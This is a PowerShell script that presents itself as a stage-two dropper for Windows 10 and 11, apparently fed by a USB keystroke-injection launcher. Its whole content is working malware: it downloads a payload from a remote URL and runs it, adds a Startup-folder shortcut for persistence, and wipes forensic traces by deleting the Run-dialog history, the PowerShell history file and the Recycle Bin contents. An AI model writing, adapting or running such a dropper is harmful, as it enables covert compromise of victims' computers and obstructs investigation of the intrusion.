# Intruder-Alert
# Author: spac3gh0st
# Description: Stage-two dropper. Downloads a payload, executes it, establishes persistence,
#              and clears forensic artifacts. See README.md for full details.
# Target: Windows 10, 11
#
# ─────────────────────────────────────────────────────────────────
# CONFIGURATION — set these before deploying
# ─────────────────────────────────────────────────────────────────

# Name the dropped file will be saved as on the target machine
$varName = "YOUR-FILENAME-HERE.exe"

# Drop directory
$dropDir = "$env:windir\temp\Cache"

# Full path to the dropped file
$outputFile = "$dropDir\$varName"

# ─────────────────────────────────────────────────────────────────
# STEP 1: Create drop directory
# ─────────────────────────────────────────────────────────────────
try {
    New-Item -ItemType Directory -Path $dropDir -Force -ErrorAction Stop | Out-Null
} catch {
    # Silently continue — directory may already exist
}

# ─────────────────────────────────────────────────────────────────
# STEP 2: Download payload
# $dc is passed in from the stage-one launcher (the Ducky Script)
# ─────────────────────────────────────────────────────────────────
try {
    Invoke-WebRequest -Uri $dc -OutFile $outputFile -ErrorAction Stop
} catch {
    exit 1  # Abort if download fails — no point continuing
}

# ─────────────────────────────────────────────────────────────────
# STEP 3: Execute payload
# ─────────────────────────────────────────────────────────────────
try {
    Start-Process -FilePath $outputFile -ErrorAction Stop
} catch {
    exit 1
}

# ─────────────────────────────────────────────────────────────────
# STEP 4: Persist via Startup folder shortcut
# ─────────────────────────────────────────────────────────────────
try {
    $shortcutPath = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$varName.lnk"
    $shell = New-Object -COM WScript.Shell
    $shortcut = $shell.CreateShortcut($shortcutPath)
    $shortcut.TargetPath = $outputFile
    $shortcut.Save()
} catch {
    # Non-fatal — continue to cleanup
}

# ─────────────────────────────────────────────────────────────────
# STEP 5: Clear forensic artifacts
# Credit: i-am-Jakoby, Luther, Hobo
# ─────────────────────────────────────────────────────────────────

# Clear Run dialog history (MRU)
try {
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" `
        -Name "*" -ErrorAction Stop
} catch {}

# Clear PowerShell command history
try {
    Remove-Item -Path (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction Stop
} catch {}

# Empty the Recycle Bin
try {
    Clear-RecycleBin -Force -ErrorAction Stop
} catch {}

# ─────────────────────────────────────────────────────────────────
# Optional: popup to signal completion (uncomment for visible feedback in lab)
# $done = New-Object -ComObject Wscript.Shell; $done.Popup("Update Completed", 1)
# ─────────────────────────────────────────────────────────────────
